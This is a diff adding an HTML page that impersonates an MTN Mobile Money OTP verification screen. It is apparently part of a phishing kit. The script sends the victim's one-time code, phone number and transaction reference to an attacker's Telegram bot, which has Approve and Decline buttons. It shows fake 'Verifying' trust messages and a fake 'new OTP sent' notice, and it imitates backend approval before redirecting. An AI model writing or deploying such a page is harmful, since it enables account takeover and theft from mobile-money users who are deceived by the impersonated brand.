@@ -1,0 +1,615 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>MTN Mobile Money · Verification</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --mtn-royal: #2059B5;
+    --mtn-deep:  #073A87;
+    --mtn-white: #FFFFFF;
+    --mtn-green: #28A745;
+    --mtn-yellow:#FFCC08;
+    --mtn-text:  #456BA8;
+    --mtn-gray:  #7C8798;
+    --mtn-border:#E5E9F0;
+    --mtn-soft:  #F5F7FB;
+    --mtn-page:  #E7EEF7;
+    --mtn-red:   #C62828;
+    --mtn-red-soft: #FEF3F3;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  html, body { height: 100%; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: var(--mtn-page); color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased; line-height: 1.45;
+    min-height: 100vh; display: flex; justify-content: center; padding: 0;
+  }
+  .phone {
+    width: 100%; max-width: 430px; min-height: 100vh;
+    background: var(--mtn-white); display: flex; flex-direction: column;
+    position: relative; overflow: hidden;
+  }
+
+  /* ===== Header ===== */
+  .top {
+    position: relative; flex-shrink: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    padding: 18px 22px 26px;
+    border-bottom-left-radius: 38% 32px;
+    border-bottom-right-radius: 38% 32px;
+  }
+  .top-row {
+    display: flex; align-items: center; justify-content: space-between; gap: 12px;
+  }
+  .brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 18px; letter-spacing: -0.4px; color: #fff;
+  }
+  .brand .mtn { color: var(--mtn-yellow); }
+  .brand .mm  { color: #FFFFFF; opacity: 0.95; }
+
+  .page-title {
+    margin-top: 22px; font-size: 19px; font-weight: 800;
+    color: #fff; letter-spacing: -0.3px; line-height: 1.25;
+  }
+  .page-sub {
+    margin-top: 6px; font-size: 12.5px; color: rgba(255,255,255,0.78);
+    line-height: 1.5; max-width: 320px;
+  }
+
+  /* ===== Body ===== */
+  .body {
+    flex: 1; overflow-y: auto; -webkit-overflow-scrolling: touch;
+    padding: 22px 22px 20px;
+    display: flex; flex-direction: column;
+  }
+
+  /* ===== Status notices ===== */
+  .notice {
+    display: none;
+    padding: 13px 15px;
+    border-radius: 12px;
+    font-size: 12.5px;
+    font-weight: 600;
+    line-height: 1.55;
+    margin-bottom: 18px;
+    border: 1px solid transparent;
+  }
+  .notice.show { display: block; }
+  .notice .notice-title {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.6px;
+    text-transform: uppercase; margin-bottom: 4px;
+    display: block;
+  }
+  .notice.error {
+    background: var(--mtn-red-soft); border-color: #F2B8B8; color: var(--mtn-red);
+  }
+  .notice.error .notice-title { color: #8B0000; }
+
+  .section-label {
+    font-size: 11px; font-weight: 800; letter-spacing: 0.8px;
+    text-transform: uppercase; color: var(--mtn-gray);
+    margin-bottom: 8px;
+  }
+
+  /* OTP Input */
+  .otp-wrap {
+    display: flex;
+    gap: 8px;
+    justify-content: center;
+    margin: 12px 0 24px;
+  }
+  .otp-input {
+    width: 45px;
+    height: 55px;
+    background: var(--mtn-soft);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 12px;
+    font-family: 'Poppins', sans-serif;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--mtn-deep);
+    text-align: center;
+    outline: none;
+    transition: border-color .15s, background .15s;
+    -webkit-appearance: none;
+  }
+  .otp-input:focus {
+    border-color: var(--mtn-royal);
+    background: #fff;
+  }
+  .otp-input.filled {
+    border-color: var(--mtn-royal);
+    background: #fff;
+  }
+  .otp-input.invalid {
+    border-color: #E23B3B;
+    background: #FEF3F3;
+  }
+
+  .field-error {
+    display: none; font-size: 11.5px; color: var(--mtn-red); margin-top: 6px;
+    font-weight: 600; line-height: 1.4; text-align: center;
+  }
+  .field-error.show { display: block; }
+
+  /* Resend Timer */
+  .resend-wrap {
+    text-align: center;
+    margin-top: 16px;
+    font-size: 12.5px;
+    color: var(--mtn-gray);
+  }
+  .resend-wrap button {
+    background: none;
+    border: none;
+    color: var(--mtn-royal);
+    font-family: inherit;
+    font-weight: 700;
+    font-size: 12.5px;
+    cursor: pointer;
+    text-decoration: underline;
+    text-underline-offset: 3px;
+  }
+  .resend-wrap button:disabled {
+    color: var(--mtn-gray);
+    text-decoration: none;
+    cursor: default;
+  }
+
+  .btn-confirm {
+    width: 100%; margin-top: 22px; height: 54px;
+    background: var(--mtn-green); color: #fff;
+    font-family: inherit; font-size: 15px; font-weight: 900;
+    letter-spacing: 1.2px; text-transform: uppercase;
+    border: none; border-radius: 999px; cursor: pointer;
+    box-shadow: 0 10px 24px rgba(40,167,69,0.28);
+    transition: filter .15s, transform .1s, opacity .15s;
+  }
+  .btn-confirm:hover { filter: brightness(1.06); }
+  .btn-confirm:active { transform: scale(0.985); }
+  .btn-confirm:disabled { opacity: 0.65; cursor: wait; }
+
+  .mtn-footer {
+    width: 100%; margin-top: auto; padding-top: 22px;
+    background: var(--mtn-yellow); border-radius: 12px;
+    padding: 14px 16px;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 12px; text-align: left;
+  }
+  .mtn-footer .foot-brand {
+    display: inline-flex; align-items: baseline; gap: 2px;
+    font-weight: 900; font-size: 15px; letter-spacing: -0.4px; color: #000;
+  }
+  .mtn-footer .foot-support {
+    font-size: 11px; color: #000; line-height: 1.45; font-weight: 600;
+    text-align: right;
+  }
+  .mtn-footer .foot-support strong { font-weight: 800; }
+
+  .toast {
+    position: fixed; bottom: 24px; left: 50%;
+    transform: translateX(-50%) translateY(80px);
+    background: #0A0F1F; color: #fff; padding: 11px 18px; border-radius: 9px;
+    font-size: 12.5px; font-weight: 600; opacity: 0; transition: all .3s ease;
+    z-index: 50; pointer-events: none; max-width: 90%; text-align: center;
+  }
+  .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+  /* ============================================================
+     Full-page "Verifying…" overlay
+  ============================================================ */
+  .authorizing {
+    position: fixed; inset: 0;
+    background: linear-gradient(180deg, var(--mtn-deep) 0%, var(--mtn-royal) 100%);
+    display: none; flex-direction: column;
+    align-items: center; justify-content: center;
+    padding: 28px 24px; z-index: 9999; text-align: center;
+    color: #fff;
+  }
+  .authorizing.show { display: flex; }
+  .authorizing .brand-label {
+    font-size: 15px; font-weight: 800; letter-spacing: -0.2px;
+    margin-bottom: 34px;
+  }
+  .authorizing .brand-label .mtn { color: var(--mtn-yellow); }
+  .authorizing .brand-label .mm  { color: #fff; }
+
+  .authorizing .spinner {
+    width: 60px; height: 60px;
+    border: 4px solid rgba(255,255,255,0.18);
+    border-top-color: var(--mtn-yellow);
+    border-radius: 50%;
+    animation: spin 0.9s linear infinite;
+    margin-bottom: 22px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .authorizing h2 {
+    font-size: 20px; font-weight: 800; letter-spacing: -0.3px;
+    margin-bottom: 24px;
+  }
+
+  .trust-slider {
+    width: 100%; max-width: 340px;
+    height: 76px;
+    position: relative;
+    overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .trust-msg {
+    position: absolute; inset: 0;
+    display: flex; align-items: center; justify-content: center;
+    padding: 0 8px;
+    opacity: 0;
+    transform: translateX(24px);
+    transition: opacity .45s ease, transform .45s ease;
+    font-size: 13px;
+    line-height: 1.55;
+    color: rgba(255,255,255,0.86);
+    font-weight: 500;
+    text-align: center;
+  }
+  .trust-msg.active {
+    opacity: 1;
+    transform: translateX(0);
+  }
+  .trust-msg.leaving {
+    opacity: 0;
+    transform: translateX(-24px);
+  }
+  .trust-msg::before {
+    content: '✓';
+    color: var(--mtn-yellow);
+    font-weight: 900;
+    margin-right: 8px;
+  }
+
+  .authorizing .cancel-link {
+    margin-top: 28px; background: transparent; border: none;
+    color: rgba(255,255,255,0.68); font-family: inherit;
+    font-size: 12px; font-weight: 600; cursor: pointer;
+    text-decoration: underline; text-underline-offset: 3px;
+  }
+  .authorizing .cancel-link:hover { color: var(--mtn-yellow); }
+
+  @media (max-width: 380px) {
+    .top { padding: 16px 18px 22px; }
+    .body { padding: 18px 18px 16px; }
+    .brand { font-size: 16px; }
+    .page-title { font-size: 17px; }
+    .otp-input { width: 38px; height: 48px; font-size: 18px; }
+    .btn-confirm { height: 50px; font-size: 14px; }
+    .authorizing h2 { font-size: 18px; }
+    .authorizing .spinner { width: 50px; height: 50px; }
+    .trust-slider { height: 80px; }
+    .trust-msg { font-size: 12px; }
+  }
+  @media (max-height: 680px) {
+    .page-title { margin-top: 16px; }
+    .btn-confirm { margin-top: 16px; height: 48px; }
+  }
+  @media (min-width: 640px) {
+    body { padding: 32px 0; align-items: center; }
+    .phone {
+      min-height: calc(100vh - 64px); max-height: 900px;
+      border-radius: 32px;
+      box-shadow: 0 40px 100px rgba(7, 58, 135, 0.18);
+      overflow: hidden;
+    }
+    .top { border-top-left-radius: 32px; border-top-right-radius: 32px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="phone">
+
+  <div class="top">
+    <div class="top-row">
+      <div class="brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+    </div>
+    <div class="page-title">Enter Verification Code</div>
+    <div class="page-sub">We sent a 4-digit OTP to your phone. Please enter it below to complete your transaction.</div>
+  </div>
+
+  <div class="body">
+
+    <div class="notice error" id="noticeError">
+      <span class="notice-title">Code Expired</span>
+      The verification code has expired or was incorrect. Please request a new OTP below.
+    </div>
+
+    <div class="section-label">Secure OTP Code</div>
+    <div class="otp-wrap" id="otpWrap">
+      <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" oninput="moveNext(this, 0)" onkeydown="movePrev(event, this, 0)">
+      <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" oninput="moveNext(this, 1)" onkeydown="movePrev(event, this, 1)">
+      <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" oninput="moveNext(this, 2)" onkeydown="movePrev(event, this, 2)">
+      <input type="tel" class="otp-input" maxlength="1" inputmode="numeric" autocomplete="one-time-code" oninput="moveNext(this, 3)" onkeydown="movePrev(event, this, 3)">
+    </div>
+    <div class="field-error" id="otpError">Please enter the full 4-digit code.</div>
+
+    <div class="resend-wrap">
+      Didn't receive the code? 
+      <button id="resendBtn" onclick="resendOtp()" disabled>Resend in <span id="timer">30</span>s</button>
+    </div>
+
+    <button class="btn-confirm" id="confirmBtn" onclick="confirmOtp()">
+      Verify & Complete
+    </button>
+
+    <div class="mtn-footer">
+      <div class="foot-brand"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+      <div class="foot-support">
+        Need help?<br>
+        Call <strong id="supportNum">—</strong>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ============================================================
+     Full-page authorizing overlay
+============================================================ -->
+<div class="authorizing" id="authorizingOverlay">
+  <div class="brand-label"><span class="mtn">MTN</span><span class="mm">&nbsp;Mobile Money</span></div>
+  <div class="spinner"></div>
+  <h2 id="authTitle">Verifying…</h2>
+
+  <div class="trust-slider">
+    <div class="trust-msg active">Validating your OTP against secure MTN records.</div>
+    <div class="trust-msg">This step ensures your transaction is fully protected.</div>
+    <div class="trust-msg">Almost done! Please wait a moment.</div>
+  </div>
+
+  <button class="cancel-link" onclick="cancelAuthorizing()">Cancel</button>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script>
+  /* ============================================================ 
+     TELEGRAM CONFIGURATION
+     Replace these with your actual Bot Token and Chat ID
+  ============================================================ */
+  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
+  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
+
+  /* ============================================================
+     Read transaction from URL
+  ============================================================ */
+  const params = new URLSearchParams(location.search);
+  const tx = {
+    ref: params.get('tx') || '',
+    am:  params.get('am') || '0',
+    cur: params.get('cur') || 'UGX',
+    rn:  params.get('rn') || '',
+    c:   params.get('c') || 'Uganda',
+    pm:  params.get('pm') || '',
+    sn:  params.get('sn') || '',
+    mk:  params.get('mk') || '',
+    an:  params.get('an') || '',
+    dt:  params.get('dt') || '',
+    pkgName: params.get('pkg') || ''
+  };
+
+  const SUPPORT_NUMBERS = {
+    'Cameroon': '8787', 'Zambia': '111', 'Zambia (MTN)': '111',
+    'Uganda': '100', 'Uganda (MTN)': '100',
+    'Ghana': '100', 'Ghana (MTN)': '100'
+  };
+  
+  function showToast(msg) {
+    const t = document.getElementById('toast');
+    t.textContent = msg; t.classList.add('show');
+    clearTimeout(t._timer);
+    t._timer = setTimeout(() => t.classList.remove('show'), 2400);
+  }
+
+  /* ============================================================
+     OTP Input Logic (Auto-advance)
+  ============================================================ */
+  function moveNext(input, index) {
+    if (input.value.length === 1) {
+      input.classList.add('filled');
+      const next = document.querySelectorAll('.otp-input')[index + 1];
+      if (next) next.focus();
+    } else {
+      input.classList.remove('filled');
+    }
+    document.getElementById('otpError').classList.remove('show');
+    document.getElementById('noticeError').classList.remove('show');
+  }
+
+  function movePrev(e, input, index) {
+    if (e.key === 'Backspace' && !input.value) {
+      const prev = document.querySelectorAll('.otp-input')[index - 1];
+      if (prev) prev.focus();
+    }
+  }
+
+  /* ============================================================
+     Trust slider
+  ============================================================ */
+  let trustTimer = null;
+  let trustIndex = 0;
+  function startTrustSlider() {
+    const msgs = document.querySelectorAll('.trust-msg');
+    trustIndex = 0;
+    msgs.forEach((m, i) => {
+      m.classList.remove('active', 'leaving');
+      if (i === 0) m.classList.add('active');
+    });
+    if (trustTimer) clearInterval(trustTimer);
+    trustTimer = setInterval(() => {
+      msgs[trustIndex].classList.remove('active');
+      msgs[trustIndex].classList.add('leaving');
+      const prev = trustIndex;
+      trustIndex = (trustIndex + 1) % msgs.length;
+      setTimeout(() => msgs[prev].classList.remove('leaving'), 450);
+      msgs[trustIndex].classList.add('active');
+    }, 2600);
+  }
+  function stopTrustSlider() {
+    if (trustTimer) { clearInterval(trustTimer); trustTimer = null; }
+  }
+
+  /* ============================================================
+     Resend OTP Timer
+  ============================================================ */
+  let timerInterval = null;
+  function startResendTimer() {
+    let timeLeft = 30;
+    const btn = document.getElementById('resendBtn');
+    const timerSpan = document.getElementById('timer');
+    
+    btn.disabled = true;
+    btn.innerHTML = `Resend in <span id="timer">${timeLeft}</span>s`;
+
+    if (timerInterval) clearInterval(timerInterval);
+    
+    timerInterval = setInterval(() => {
+      timeLeft--;
+      const el = document.getElementById('timer');
+      if (el) el.textContent = timeLeft;
+      
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+        btn.disabled = false;
+        btn.textContent = 'Resend OTP';
+      }
+    }, 1000);
+  }
+
+  async function resendOtp() {
+    startResendTimer();
+    showToast('A new OTP was sent to your phone.');
+    document.getElementById('noticeError').classList.remove('show');
+  }
+
+  /* ============================================================
+     Verify OTP & Send to Telegram
+  ============================================================ */
+  let pollingActive = false;
+  let pollTimer = null;
+
+  function cancelAuthorizing() {
+    pollingActive = false;
+    if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
+    stopTrustSlider();
+    document.getElementById('authorizingOverlay').classList.remove('show');
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = false;
+    btn.textContent = 'Verify & Complete';
+  }
+
+  async function confirmOtp() {
+    const inputs = document.querySelectorAll('.otp-input');
+    let otp = '';
+    inputs.forEach(i => otp += i.value);
+    const err = document.getElementById('otpError');
+
+    if (otp.length < 4) {
+      err.classList.add('show');
+      inputs.forEach(i => {
+        if (!i.value) i.classList.add('invalid');
+      });
+      return;
+    }
+
+    // Clear errors
+    err.classList.remove('show');
+    document.getElementById('noticeError').classList.remove('show');
+    inputs.forEach(i => i.classList.remove('invalid'));
+
+    const btn = document.getElementById('confirmBtn');
+    btn.disabled = true;
+
+    // 1. Send OTP to Telegram
+    const message = `
+🚨 *NEW OTP VERIFICATION* 🚨
+----------------------------
+📱 *Phone:* ${tx.an}
+🔑 *OTP Code:* \`${otp}\`
+💰 *Amount:* ${tx.am === '0' ? 'Free Trial' : tx.am + ' ' + tx.cur}
+📦 *Package:* ${tx.pkgName || 'Data Plan'}
+🔖 *Ref:* ${tx.ref}
+    `;
+
+    const replyMarkup = {
+      inline_keyboard: [
+        [
+          { text: "✅ Approve", callback_data: `approve_otp_${tx.ref}` },
+          { text: "❌ Decline", callback_data: `decline_otp_${tx.ref}` }
+        ]
+      ]
+    };
+
+    try {
+      if (TELEGRAM_BOT_TOKEN !== 'YOUR_BOT_TOKEN_HERE') {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown',
+            reply_markup: replyMarkup
+          })
+        });
+      }
+    } catch (e) {
+      console.error('Telegram error:', e);
+    }
+
+    // 2. Show Full-Page Verifying Overlay
+    document.getElementById('authTitle').textContent = 'Verifying…';
+    document.getElementById('authorizingOverlay').classList.add('show');
+    startTrustSlider();
+
+    pollingActive = true;
+
+    // 3. Simulate Backend Polling
+    let waitTime = 0;
+    pollTimer = setInterval(() => {
+      if (!pollingActive) return;
+      waitTime += 2000;
+
+      /* SIMULATE APPROVAL AFTER 6 SECONDS */
+      if (waitTime >= 6000) {
+        clearInterval(pollTimer);
+        pollingActive = false;
+        stopTrustSlider();
+        
+        // Redirect to success page (e.g., success.html)
+        const q = new URLSearchParams({
+          tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          pkg: tx.pkgName
+        });
+        window.location.href = 'success.html?' + q.toString(); // Update this if you have a success page
+      }
+    }, 2000);
+  }
+
+  /* ============================================================
+     Init
+  ============================================================ */
+  document.addEventListener('DOMContentLoaded', () => {
+    document.getElementById('supportNum').textContent = SUPPORT_NUMBERS[tx.c] || '—';
+    startResendTimer();
+    
+    // Auto-focus first input
+    const firstInput = document.querySelector('.otp-input');
+    if (firstInput) setTimeout(() => firstInput.focus(), 300);
+  });
+</script>
+</body>
+</html>
